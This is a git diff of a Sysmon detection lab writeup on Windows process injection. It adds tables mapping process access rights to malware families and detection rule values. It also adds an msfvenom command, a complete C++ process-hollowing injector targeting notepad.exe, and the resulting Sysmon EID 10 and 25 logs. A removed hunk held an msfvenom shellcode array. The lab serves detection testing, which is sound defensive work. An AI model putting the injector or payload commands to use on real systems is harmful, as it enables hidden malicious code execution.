@@ -5,6 +5,42 @@ What each Sysmon Event ID catches:
 - Event ID 25 ProcessTampering: Fires specifically on image replacement or process hollowing when the mapped image in memory no longer matches the file on disk. Catches: hollowing, module stomping, some reflective DLL variants.
 <img width="942" height="712" alt="image" src="https://github.com/user-attachments/assets/65977293-a5d1-43cc-8dab-a8c0f33aa17d" />
 
+## Process Access Rights
+| Value    | Breakdown                                           | Technique / Context                        |
+|----------|-----------------------------------------------------|--------------------------------------------|
+| 0x1fffff | PROCESS_ALL_ACCESS                                  | Lazy injectors, lab code, commodity malware|
+| 0x143a   | VM_WRITE+VM_OP+CREATE_THREAD+QUERY                  | Classic CRT injection minimum              |
+| 0x1410   | VM_WRITE+VM_READ+VM_OP                              | Memory write, no thread creation           |
+| 0x1010   | VM_READ+QUERY_LIMITED                               | Reconnaissance, credential dumping         |
+| 0x0040   | DUP_HANDLE                                          | Handle duplication attacks                 |
+| 0x0800   | SUSPEND_RESUME                                      | Thread hijacking, context manipulation     |
+| 0x0010   | VM_READ only                                        | Memory scraping, credential theft          |
+| 0x0020   | VM_WRITE only                                       | Targeted memory patch                      |
+| 0x0400   | QUERY_INFORMATION only                              | Process reconnaissance                     |
+| 0x1000   | QUERY_LIMITED_INFORMATION                           | Stealthy enumeration                       |
+| 0x047a   | VM_WRITE+VM_OP+CREATE_THREAD+DUP_HANDLE             | Injection with handle duplication          |
+| 0x1f0fff | ALL_ACCESS older Windows builds                     | Pre-Win8 PROCESS_ALL_ACCESS variant        |
+| 0x1f3fff | ALL_ACCESS alternate                                | Seen in older Metasploit modules           |
+| 0x0478   | VM_WRITE+VM_OP+DUP_HANDLE+QUERY                     | No thread creation — APC or hijack path    |
+| 0x1438   | VM_WRITE+VM_OP+SUSPEND_RESUME+QUERY                 | Thread hijacking injection                 |
+| 0x0002   | CREATE_THREAD only                                  | Thread creation in already-written memory  |
+| 0x0008   | VM_OPERATION only                                   | VirtualProtect changes, no write           |
+| 0x101a   | VM_WRITE+VM_OP+VM_READ+QUERY_LIMITED                | Reflective DLL injection pattern           |
+| 0x147a   | VM_WRITE+VM_OP+CREATE_THREAD+DUP+QUERY+SUSPEND      | Full injection with suspend capability     |
+
+### Real Malware Examples
+| Malware Family    | GrantedAccess | Notes                              |
+|-------------------|---------------|------------------------------------|
+| Cobalt Strike     | 0x1fffff      | Default beacon injection           |
+| Cobalt Strike     | 0x143a        | With minimal rights setting        |
+| Meterpreter       | 0x1fffff      | Default migrate                    |
+| TrickBot          | 0x1410        | Memory write without thread        |
+| Dridex            | 0x0800        | Thread hijack path                 |
+| Emotet            | 0x143a        | Classic injection minimum          |
+| Mimikatz          | 0x1010        | LSASS credential dump              |
+| Mimikatz          | 0x0010        | Minimal LSASS read                 |
+
+
 ## Lab setup
 1. Windows Host running ELK in WSL with local FW rules to push traffic to the host -> WSL
 2. Windows VM with Elastic Agent, Sysmon and sysmonconfig-olaf-filedelete.xml on bridged network
@@ -248,7 +284,7 @@ DestinationPort: 4444
 DestinationPortName: -"
 
 ### SYSMON analysis
-Had to add in ProcessAcess onmatch=include with GrantedAccess value 0x1FFFFF to catch event 1. Added ProcessInjectionDelux to cover all types of RW codes. Also csrss.exe opens handles to every process that starts or exits on the system so could need to exclude for less noise.
+Had to add in ProcessAcess onmatch=include with GrantedAccess value 0x1FFFFF to catch event 1. Added ProcessInjectionDelux to cover all types of binary codes (  0x1FFFFF;0x1F0FFF;0x1F1FFF;0x1F2FFF;0x1F3FFF;0x143A;0x147A;0x047A;0x1410;0x1438;0x0478;0x1010;0x1410). Also csrss.exe opens handles to every process that starts or exits on the system so could need to exclude for less noise.
 
 | Step | Action                                | Sysmon EID | Rule Triggered          |
 |------|---------------------------------------|------------|-------------------------|
@@ -483,7 +519,7 @@ DestinationPortName: -"
 
 ## 3. APC Queue Code Injection
 Threads can execute code asynchronously by leveraging APC queues. It queues a function call to an existing thread in the target process rather than creating a new thread. For APC to execute the target thread must enter an alertable wait state via SleepEx, WaitForSingleObjectEx or similar and cannot force the victim thread to execute the injected code. This variant creates the target process suspended, queues the APC before any user code runs, then resumes. The main thread is alertable by default during initialisation.
-APC execution
+
 | API Call            | Layer      | Sysmon Event |
 |---------------------|------------|--------------|
 | OpenProcess()       | Win32      | EID 10       |
@@ -638,30 +674,171 @@ footprint.
 
 
 ## 3. ProcessHollowing
-Process hollowing creates a legitimate process suspended, unmaps its original image from memory, then maps malicious code in its place before resuming. The process looks legitimate from the outside with correct name, path, and PID but runs entirely different code. EID 25 should fire because Sysmon detects the in-memory image no longer matches the on-disk PE.
-Issue triggering revershell from hollowed process context so instead switch payload to launch calc.exe:
-- msfvenom -p windows/x64/exec CMD=calc.exe -f c
-``` 
-unsigned char buf[] = 
-"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
-"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
-"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
-"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
-"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
-"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
-"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
-"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
-"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
-"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
-"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
-"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
-"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
-"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
-"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
-"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
-"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
-"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
-"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
-"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
-```
+Process hollowing creates a legitimate process suspended, unmaps its original image from memory, then maps malicious code in its place before resuming. The process looks legitimate from the outside with correct name, path, and PID but runs entirely different code. EID 25 should fire because Sysmon detects the in-memory image no longer matches the on-disk PE. Issue triggering revershell from hollowed process context so instead switch payload to launch calc.exe, however still issue spawning it but sysmon triggers on EID 25:
+- msfvenom -p windows/x64/exec CMD=calc.exe -f c --arch x64 --platform windows -b "\x00\x0a\x0d"
+| API Call                 | Layer      | Sysmon Event |
+|--------------------------|------------|--------------|
+| CreateProcess(SUSPENDED) | Win32      | —            |
+| NtQueryInformationProcess| Native API | —            |
+| ReadProcessMemory()      | Win32      | —            |
+| NtUnmapViewOfSection()   | Native API | EID 25       |
+| VirtualAllocEx()         | Win32      | —            |
+| WriteProcessMemory()     | Win32      | —            |
+| SetThreadContext()       | Win32      | —            |
+| ResumeThread()           | Win32      | —            |
 
+```
+// t4_process_hollowing.cpp
+#include "common.h"
+#include <winternl.h>
+
+typedef NTSTATUS(WINAPI* NtUnmapViewOfSection)(HANDLE, PVOID);
+typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
+    HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
+
+int main() {
+    wprintf(L"[*] Starting process hollowing x64...\n");
+
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi = {};
+
+    if (!CreateProcessW(
+        L"C:\\Windows\\System32\\notepad.exe",
+        NULL, NULL, NULL, FALSE,
+        CREATE_SUSPENDED,
+        NULL, NULL, &si, &pi)) {
+        wprintf(L"[-] CreateProcess failed: %lu\n", GetLastError());
+        return 1;
+    }
+    wprintf(L"[+] Suspended PID: %lu TID: %lu\n",
+            pi.dwProcessId, pi.dwThreadId);
+
+    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+
+    auto NtQIP = (pNtQueryInformationProcess)GetProcAddress(
+        ntdll, "NtQueryInformationProcess");
+
+    PROCESS_BASIC_INFORMATION pbi = {};
+    ULONG retLen = 0;
+    NtQIP(pi.hProcess, ProcessBasicInformation,
+          &pbi, sizeof(pbi), &retLen);
+    wprintf(L"[+] PEB at: 0x%p\n", pbi.PebBaseAddress);
+
+    // x64 PEB offset 0x10 = ImageBaseAddress
+    PVOID imageBase = NULL;
+    SIZE_T bytesRead = 0;
+    ReadProcessMemory(pi.hProcess,
+        (PBYTE)pbi.PebBaseAddress + 0x10,
+        &imageBase, sizeof(PVOID), &bytesRead);
+    wprintf(L"[+] Remote image base: 0x%p\n", imageBase);
+
+    // Unmap original image — EID 25 fires here
+    auto myNtUnmap = (NtUnmapViewOfSection)GetProcAddress(
+        ntdll, "NtUnmapViewOfSection");
+    NTSTATUS st = myNtUnmap(pi.hProcess, imageBase);
+    wprintf(L"[+] NtUnmapViewOfSection: 0x%08X\n", st);
+
+    // Allocate at original base
+    LPVOID newMem = VirtualAllocEx(
+        pi.hProcess, imageBase,
+        shellcode_size + 0x2000,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+    if (!newMem) {
+        wprintf(L"[!] Original base failed, using NULL\n");
+        newMem = VirtualAllocEx(
+            pi.hProcess, NULL,
+            shellcode_size + 0x2000,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE
+        );
+    }
+    wprintf(L"[+] Allocated at: 0x%p\n", newMem);
+
+    // Shellcode at +0x1000 for alignment
+    LPVOID shellcodeAddr = (PVOID)((ULONG_PTR)newMem + 0x1000);
+
+    SIZE_T written = 0;
+    WriteProcessMemory(pi.hProcess, shellcodeAddr,
+                       shellcode, shellcode_size, &written);
+    wprintf(L"[+] Shellcode written: %zu bytes at 0x%p\n",
+            written, shellcodeAddr);
+
+    // Update PEB ImageBaseAddress
+    WriteProcessMemory(pi.hProcess,
+        (PBYTE)pbi.PebBaseAddress + 0x10,
+        &newMem, sizeof(PVOID), NULL);
+    wprintf(L"[+] PEB ImageBase updated\n");
+
+    // Verify bytes
+    unsigned char verify[8] = {};
+    ReadProcessMemory(pi.hProcess, shellcodeAddr, verify, 8, NULL);
+    wprintf(L"[+] First bytes at Rip: ");
+    for (int i = 0; i < 8; i++) wprintf(L"%02X ", verify[i]);
+    wprintf(L"\n");
+
+    // Get full thread context
+    CONTEXT ctx = {};
+    ctx.ContextFlags = CONTEXT_FULL;
+    GetThreadContext(pi.hThread, &ctx);
+    wprintf(L"[+] Original Rip: 0x%llx\n", ctx.Rip);
+    wprintf(L"[+] Original Rsp: 0x%llx\n", ctx.Rsp);
+
+    // x64 — Rip is instruction pointer
+    ctx.Rip = (DWORD64)shellcodeAddr;
+
+    // Align stack + shadow space
+    ctx.Rsp = (ctx.Rsp & ~0xF) - 0x28;
+
+    SetThreadContext(pi.hThread, &ctx);
+    wprintf(L"[+] Rip set to: 0x%p\n", shellcodeAddr);
+
+    ResumeThread(pi.hThread);
+    wprintf(L"[*] Resumed — watch for EID 25\n");
+
+    WaitForSingleObject(pi.hProcess, 10000);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return 0;
+}
+```
+### Sysmon Data
+1. "Process accessed:
+RuleName: technique_id=T1055.001,technique_name=ProcessInjectionDelux
+UtcTime: 2026-05-13 11:26:48.557
+SourceProcessGUID: {ED9BFE1B-5FF8-6A04-1A02-000000000F00}
+SourceProcessId: 6860
+SourceThreadId: 13532
+SourceImage: C:\Users\jens\Documents\procInj\t4_process_hollowing.exe
+TargetProcessGUID: {ED9BFE1B-5FF8-6A04-1B02-000000000F00}
+TargetProcessId: 10384
+TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
+GrantedAccess: 0x1fffff
+CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+1636b4|C:\WINDOWS\System32\KERNELBASE.dll+8b82d|C:\WINDOWS\System32\KERNELBASE.dll+88e86|C:\WINDOWS\System32\KERNEL32.DLL+3c624|C:\Users\jens\Documents\procInj\t4_process_hollowing.exe+1624|C:\Users\jens\Documents\procInj\t4_process_hollowing.exe+10d9|C:\Users\jens\Documents\procInj\t4_process_hollowing.exe+1456|C:\WINDOWS\System32\KERNEL32.DLL+2e957|C:\WINDOWS\SYSTEM32\ntdll.dll+427c
+SourceUser: WIN11\jens
+TargetUser: WIN11\jens"
+
+2. "Process Tampering:
+RuleName: -
+UtcTime: 2026-05-13 11:26:48.646
+ProcessGuid: {ED9BFE1B-5FF8-6A04-1B02-000000000F00}
+ProcessId: 10384
+Image: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
+Type: Image is replaced
+User: WIN11\jens"
+
+
+### Sysmon Analysis
+EID 25 fired with Type: Image is replaced, confirms Sysmon detected the in-memory image mismatch caused by NtUnmapViewOfSection removing the original notepad image. Need to add RuleName to config so its not "-".
+| Step | Action                                  | Sysmon EID | Rule Triggered          |
+|------|-----------------------------------------|------------|-------------------------|
+| 1    | Injector opens handle to Notepad        | EID 10     | ProcessInjectionDelux   |
+| 2    | NtUnmapViewOfSection removes image      | EID 25     | Process Tampering       |
+| 3    | Shellcode written to remote memory      | —          | —                       |
+| 4    | Thread context redirected to shellcode  | —          | —                       |
+| 5    | Thread resumed                          | —          | —                       |
+
+### Key Indicators
+- **EID 25** `Type: Image is replaced` On-disk PE no longer matches in-memory image.
+- **EID 10** `GrantedAccess: 0x1fffff` injector opens handle to target.
